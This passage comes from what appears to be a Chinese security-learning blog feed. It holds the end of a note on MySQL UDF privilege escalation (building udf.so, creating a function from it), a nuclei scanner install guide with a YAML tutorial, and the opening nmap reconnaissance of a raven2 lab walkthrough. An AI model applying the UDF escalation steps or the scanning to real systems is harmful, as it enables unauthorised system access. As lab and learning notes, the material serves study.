&quot;C&quot; my_bool testadd_init(UDF_INIT *initid, UDF_ARGS *args, char *message)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>g++ -shared -fPIC -I /usr/include/mysql -o udf.so udf.cpp</p><p>然后需要将我们编译好的udf.so下载到mysql相应的目录中，<br>记得<code>select version();</code><br>查看版本，然后就是创建函数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function函数名 returns string soname &quot;udf.so&quot;</span><br></pre></td></tr></table></figure><br>函数名必须和源码的一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * frome mysql.func</span><br></pre></td></tr></table></figure><p>执行函数<br>select 函数名</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>UDF提权就是MYSQL的服务端由谁运行就可以获得谁的权限,UDF提的是系统的权而不是数据库用户的</p><p>在Linux下5.7版本之后，默认运行时MySQL的是mysql用户，所以在MySQL 5.7版本之后，UDF提权基本上来讲算是失效了，<br>除非管理员手动用root身份去运行MYSQL，5.7之前MySQL运行时默认是以root身份去运行的</p><p><del>所以我昨天那个靶机问题应该是在我提权的函数名不一样，但我懒的再改了/ww</del></p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nuclei模板编写&amp;&amp;yaml学习</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-yaml%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-yaml%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>Nuclei 是一种可快速利用的漏洞扫描程序，旨在探测现代应用程序、基础设施、云平台和网络，帮助<br>识别和缓解漏洞。</p><p>Nuclei的核心是利用模板(表示为简单的 YAML 文件)来描述检测、排名和解决特定安全漏洞的方<br>法。</p><p>每个模板都描述了可能的攻击路线，详细说明了漏洞、其严重性、优先级以及偶尔出现的相关漏洞。<br>这种以模板为中心的方法确保 Nuclei不仅可以识别潜在威胁，还可以精确定位具有切实现实影响的可<br>利用漏洞。</p><h2 id="nuclei安装教程"><a href="#nuclei安装教程" class="headerlink" title="nuclei安装教程"></a>nuclei安装教程</h2><p>安装nuclei的三种方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/projectdiscovery/nuclei/releases</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull projectdiscovery/nuclei:latest</span><br></pre></td></tr></table></figure><p>windows下推荐直接下载二进制文件就行了，简单方便</p><p>linux下直接<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install nuclei </span><br></pre></td></tr></table></figure><br>不需要go环境就能下载完成</p><p>验证安装成功与否<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nuclei -h</span><br></pre></td></tr></table></figure><br><img src="https://pic.imgdb.cn/item/667d4b9dd9c307b7e9a9ba2c.png" alt=""><br>下载以后先更新<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nuclei -up   #更新nuclei</span><br><span class="line">nuclei -ut   #更新脚本</span><br></pre></td></tr></table></figure></p><p>nuclei命令集<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">  nuclei [命令]</span><br><span class="line"> </span><br><span class="line">命令：</span><br><span class="line">目标：</span><br><span class="line">   -u, -target string[]                 指定扫描的URL/主机</span><br><span class="line">   -l, -list string                     指定需要扫描的URL/主机文件（一行一个）</span><br><span class="line"> </span><br><span class="line">模板：</span><br><span class="line">   -t, -templates string[]              指定需要扫描的模板或者模板的路径</span><br><span class="line">   -nt, -new-templates                  只扫描最新版本中添加的模板</span><br><span class="line">   -w, -workflows string[]              指定扫描中的工作流或者工作流目录</span><br><span class="line">   -validate                            验证通过的模板</span><br><span class="line">   -tl                                  列出所有可用的模板</span><br><span class="line"> </span><br><span class="line">过滤：</span><br><span class="line">   -tags string[]                       执行有标记的模板子集</span><br><span class="line">   -etags, -exclude-tags string[]       执行标记为排除的模板</span><br><span class="line">   -itags, -include-tags string[]       不执行具有攻击性的模板</span><br><span class="line">   -et, -exclude-templates string[]     要排除的模板或者模板目录</span><br><span class="line">   -it, -include-templates string[]     执行默认或配置中排除的模板</span><br><span class="line">   -s, -severity value[]                根据严重性运行模板，允许的值有：info,low,medium,high,critical   </span><br><span class="line">   -es, -exclude-severity value[]       根据严重性排除模板，允许的值有：info,low,medium,high,critical   </span><br><span class="line">   -a, -author string[]                 执行指定作者的模板</span><br><span class="line"> </span><br><span class="line">输出：</span><br><span class="line">   -o, -output string                   输出发现的问题到文件</span><br><span class="line">   -silent                              只显示结果</span><br><span class="line">   -nc, -no-color                       禁用输出内容着色（ANSI转义码）</span><br><span class="line">   -json                                输出为jsonL（ines）</span><br><span class="line">   -irr, -include-rr                    在JSONL中输出对应的请求和相应（仅结果）</span><br><span class="line">   -nm, -no-meta                        不显示匹配的元数据</span><br><span class="line">   -nts, -no-timestamp                  不在输出中显示时间戳</span><br><span class="line">   -rdb, -report-db string              本地的Nuclei结果数据库（始终使用该数据库保存结果）       </span><br><span class="line">   -me, -markdown-export string         以markdown导出结果</span><br><span class="line">   -se, -sarif-export string            以SARIF导出结果</span><br><span class="line"> </span><br><span class="line">配置：</span><br><span class="line">   -config string                       指定Nuclei的配置文件</span><br><span class="line">   -rc, -report-config string           指定Nuclei报告模板文件</span><br><span class="line">   -H, -header string[]                 指定报告中的标题：value格式</span><br><span class="line">   -V, -var value                       通过var=value指定var值</span><br><span class="line">   -r, -resolvers string                指定Nuclei的解析文件</span><br><span class="line">   -sr, -system-resolvers               当DNS错误时使用系统DNS</span><br><span class="line">   -passive                             启用被动扫描处理HTTP响应</span><br><span class="line">   -ev, env-vars                        在模板中使用环境变量</span><br><span class="line"> </span><br><span class="line">交互：</span><br><span class="line">   -inserver, -ineractsh-server string  使用interactsh反连检测平台（默认为&quot;https://interact.sh&quot;）</span><br><span class="line">   -itoken, -interactsh-token string    指定反连检测平台的身份凭证</span><br><span class="line">   -interactions-cache-size int         指定保存在交互缓存中的请求数（默认：5000）</span><br><span class="line">   -interactions-eviction int           聪缓存中删除请求前等待的时间（默认为60秒）</span><br><span class="line">   -interactions-poll-duration int      每个轮询前等待时间（默认为5秒）</span><br><span class="line">   -interactions-cooldown-period int    退出轮询前的等待时间（默认为5秒）</span><br><span class="line">   -ni, -no-interactsh                  禁用反连检测平台，同时排除基于反连检测的模板</span><br><span class="line"> </span><br><span class="line">限速：</span><br><span class="line">   -r1, -rate-limit int                 每秒最大请求量（默认：150）</span><br><span class="line">   -rlm, -rate-limit-minute int         每分钟最大请求量</span><br><span class="line">   -bs, -bulk-size int                  每个模板最大并行检测数（默认：25）</span><br><span class="line">   -c, -concurrency int                 并行执行的最大模板数量（默认：25）</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">优化：</span><br><span class="line">   -timeout int                         超时时间（默认为5秒）</span><br><span class="line">   -retries int                         重试次数（默认：1）</span><br><span class="line">   -mhe, -max-host-error int            某主机扫描失败次数，跳过该主机（默认：30）</span><br><span class="line">   -project                             使用项目文件夹避免多次发送同一请求</span><br><span class="line">   -project-path string                 设置特定的项目文件夹</span><br><span class="line">   -spm, -stop-at-first-path            得到一个结果后停止（或许会中断模板和工作流的逻辑）</span><br><span class="line">   -stream                              流模式 - 在不整理输入的情况下详细描述</span><br><span class="line"> </span><br><span class="line">无界面浏览器：</span><br><span class="line">    -headless                           启用需要无界面浏览器的模板</span><br><span class="line">    -page-timeout int                   在无界面下超时秒数（默认：20）</span><br><span class="line">    -sb, -show-brower                   在无界面浏览器运行模板时，显示浏览器</span><br><span class="line">    -sc, -system-chrome                 不使用Nuclei自带的浏览器，使用本地浏览器</span><br><span class="line"> </span><br><span class="line">调试：</span><br><span class="line">    -debug                              显示所有请求和响应</span><br><span class="line">    -debug-req                          显示所有请求</span><br><span class="line">    -debug-resp                         显示所有响应</span><br><span class="line">    -proxy, -proxy-url string           使用HTTP代理</span><br><span class="line">    -proxy-socks-url string             使用SOCK5代理</span><br><span class="line">    -tlog, -trace-log string            写入请求日志到文件</span><br><span class="line">    -version                            显示版本信息</span><br><span class="line">    -v, -verbose                        显示详细信息</span><br><span class="line">    -vv                                 显示额外的详细信息</span><br><span class="line">    -tv, -templates-version             显示已安装的模板版本</span><br><span class="line"> </span><br><span class="line">升级：</span><br><span class="line">    -update                             更新Nuclei到最新版本</span><br><span class="line">    -ut, -update-templates              更新Nuclei模板到最新版</span><br><span class="line">    -ud, -update-directory string       覆盖安装模板</span><br><span class="line">    -duc, -disable-update-check         禁用更新</span><br><span class="line"> </span><br><span class="line">统计：</span><br><span class="line">    -stats                              显示正在扫描的统计信息</span><br><span class="line">    -sj, -stats-json                    将统计信息以JSONL格式输出到文件</span><br><span class="line">    -si, -stats-inerval int             显示统计信息更新的间隔秒数（默认：5）</span><br><span class="line">    -m, -metrics                        显示Nuclei端口信息</span><br><span class="line">    -mp, -metrics-port int              更改Nuclei默认端口（默认：9092）</span><br></pre></td></tr></table></figure></p><p>或者直接使用nuclei给的页面进行</p><p><a href="https://cloud.projectdiscovery.io/">https://cloud.projectdiscovery.io/</a></p><h2 id="yaml学习"><a href="#yaml学习" class="headerlink" title="yaml学习"></a>yaml学习</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul><li>大小写敏感</li><li>使用缩进表示层次关系（和Python挺像的</li><li>缩进不能使用TAB制表符，只能是空格</li><li><h1 id="表示注释"><a href="#表示注释" class="headerlink" title="表示注释"></a>表示注释</h1></li><li>缩进空格数不重要，但是同一层次必须元素左对齐</li></ul><h4 id="yaml对象"><a href="#yaml对象" class="headerlink" title="yaml对象"></a>yaml对象</h4><p>对象键值对<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">简单的可以使用冒号形式</span><br><span class="line">key: value冒号后面需要加一个空格</span><br><span class="line">也可以使用key:&#123;key1:value1,key2:value2&#125;</span><br><span class="line">亦或是</span><br><span class="line">key:</span><br><span class="line">    child-key:value</span><br><span class="line">    child-key2:value2</span><br></pre></td></tr></table></figure></p><p>对于相对比较复杂的对象格式，可以使用一个问好加一个空格表示一个<br>复杂的KEY，配合一个而冒号加一个空格表示一个value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">? </span><br><span class="line">  - complexkey1</span><br><span class="line">  - complexkey2</span><br><span class="line">:</span><br><span class="line">  - complexvalue1</span><br><span class="line">  - complexvalue2</span><br></pre></td></tr></table></figure><p>表示对象的属性是一个数组<code>[complexkey1,complexkey2]</code><br>对象的值也是要给数组<code>[complexvalue1,complexvalue2]</code></p><h4 id="yaml数组"><a href="#yaml数组" class="headerlink" title="yaml数组"></a>yaml数组</h4><p>以<code>-</code>开头表示一个数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- a</span><br><span class="line">- b</span><br><span class="line">- c</span><br></pre></td></tr></table></figure><p>YAML 支持多维数组，可以使用行内表示：<br><code>key: [value1,value2,...]</code></p><p>数据结构的子成员是一个数组，则可以在该项下面缩进一个空格<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-</span><br><span class="line"> - a</span><br><span class="line"> - b</span><br><span class="line"> - c</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>举一个相对比较复杂的例子<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">students:</span><br><span class="line">-</span><br><span class="line">  id: 1</span><br><span class="line">  name: creeper</span><br><span class="line">  grade: 100</span><br><span class="line">-</span><br><span class="line">  id: 2</span><br><span class="line">  name: tenurnight</span><br><span class="line">  grade: 120</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>就是流式里面的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">students: [&#123;id: 1,name: creeper,grade: 100&#125;,&#123;id: 2,name: tenurnight,grade: 120&#125;]</span><br></pre></td></tr></table></figure></p><h4 id="复合结构"><a href="#复合结构" class="headerlink" title="复合结构"></a>复合结构</h4><p>yml的复合结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">language: </span><br><span class="line"> - python</span><br><span class="line"> - javascript</span><br><span class="line"> - ruby</span><br><span class="line"> - go</span><br><span class="line">websites: </span><br><span class="line"> yaml: yaml.org</span><br><span class="line"> ruby: ruby.org</span><br><span class="line"> python: python.org</span><br><span class="line"> go: go.org</span><br></pre></td></tr></table></figure><p>其实就是json的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> language: [&#x27;python&#x27;,&#x27;javascript&#x27;,&#x27;ruby&#x27;,&#x27;go&#x27;]</span><br><span class="line"> websites:</span><br><span class="line">  &#123;</span><br><span class="line">   yaml: &quot;yaml.org&quot;</span><br><span class="line">   ruby: &quot;ruby.org&quot;</span><br><span class="line">   python: &quot;python.org&quot;</span><br><span class="line">   go: &quot;go.org&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h4 id="纯量"><a href="#纯量" class="headerlink" title="纯量"></a>纯量</h4><p>纯量是不可分割的，最基本的值</p><ul><li>字符串</li><li>布尔值</li><li>整数</li><li>浮点型</li><li>NULL</li><li>时间</li><li>日期</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: </span><br><span class="line">    - TRUE  #true,True都可以</span><br><span class="line">    - FALSE  #false，False都可以</span><br><span class="line">float:</span><br><span class="line">    - 3.14</span><br><span class="line">    - 6.8523015e+5  #可以使用科学计数法</span><br><span class="line">int:</span><br><span class="line">    - 123</span><br><span class="line">    - 0b1010_0111_0100_1010_1110    #二进制表示</span><br><span class="line">null:</span><br><span class="line">    nodeName: &#x27;node&#x27;</span><br><span class="line">    parent: ~  #使用~表示null</span><br><span class="line">string:</span><br><span class="line">    - 哈哈</span><br><span class="line">    - &#x27;Hello world&#x27;  #可以使用双引号或者单引号包裹特殊字符</span><br><span class="line">    - newline</span><br><span class="line">      newline2    #字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="line">date:</span><br><span class="line">    - 2018-02-17    #日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="line">datetime: </span><br><span class="line">    -  2018-02-17T15:02:31+08:00    #时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></pre></td></tr></table></figure><h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">defaults: &amp;defaults</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  database: myapp_development</span><br><span class="line">  &lt;&lt;: *defaults</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">  database: myapp_test</span><br><span class="line">  &lt;&lt;: *defaults</span><br></pre></td></tr></table></figure><p>相当于<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">defaults:</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  database: myapp_development</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">  database: myapp_test</span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>就是使用&amp;建立锚点，使用&lt;&lt;表示合并到当前数据，*用来引用锚点</p><p>我的理解就是&amp;就是建立一个函数<br>&lt;&lt;就是告诉你我要在这里引用<br>*就是调用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- &amp;showell Steve </span><br><span class="line">- Clark </span><br><span class="line">- Brian </span><br><span class="line">- Oren </span><br><span class="line">- *showell </span><br></pre></td></tr></table></figure><p>转换成js就是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ &#x27;Steve&#x27;, &#x27;Clark&#x27;, &#x27;Brian&#x27;, &#x27;Oren&#x27;, &#x27;Steve&#x27; ]</span><br></pre></td></tr></table></figure></p><p>参考地址：<br><a href="https://www.runoob.com/w3cnote/yaml-intro.html">https://www.runoob.com/w3cnote/yaml-intro.html</a><br><a href="https://www.ruanyifeng.com/blog/2016/07/yaml.html">https://www.ruanyifeng.com/blog/2016/07/yaml.html</a><br><a href="https://www.jianshu.com/p/97222440cd08">https://www.jianshu.com/p/97222440cd08</a><br><a href="https://daihainidewo.github.io/blog/yaml%E6%95%99%E7%A8%8B/">https://daihainidewo.github.io/blog/yaml%E6%95%99%E7%A8%8B/</a></p>]]></content>
      
      
      <categories>
          
          <category> 语言学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语言学习 </tag>
            
            <tag> nuclei </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>raven2靶场</title>
      <link href="/2025/01/08/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-raven2/"/>
      <url>/2025/01/08/2024%E5%B9%B46%E6%9C%8827%E6%97%A5-raven2/</url>
      
        <content type="html"><![CDATA[<h1 id="raven2靶场"><a href="#raven2靶场" class="headerlink" title="raven2靶场"></a>raven2靶场</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ifconfig                    </span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.159.129  netmask 255.255.255.0  broadcast 192.168.159.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe4d:c7ff  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:4d:c7:ff  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 5665  bytes 556139 (543.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 7213  bytes 2015885 (1.9 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 8  bytes 480 (480.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 8  bytes 480 (480.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">                                                                                             </span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sS  192.168.159.0/24 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST</span><br><span class="line">Nmap scan report for 192.168.159.1</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.2</span><br><span class="line">Host is up (0.000084s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line">MAC Address: 00:50:56:E1:64:0A (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.132</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">MAC Address: 00:0C:29:57:62:33 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.254</span><br><span class="line">Host is up (0.000054s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.159.254 are in ignored states.</span><br><span class="line">Not shown: 1000 filtered tcp ports (no-response)</span><br><span class="line">MAC Address: 00:50:56:FD:C9:B4 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.159.129</span><br><span class="line">Host is up (0.0000040s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 12.00 seconds</span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sS -p- 192.168.159.132</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 21:26 CST</span><br><span class="line">Nmap scan report for 192.168.159.132</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">60300/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:57:62:33 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds</span><br></pre></td></tr></table></figure><p>访问192.168.169.132:80<br>就是一个简答的网站，扫描后台<br><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f6c0.png" alt=""><br>有一个DS_STORE，还有vender</p><p><img src="https://pic.imgdb.cn/item/667d701ed9c307b7e9f3f58b.png" 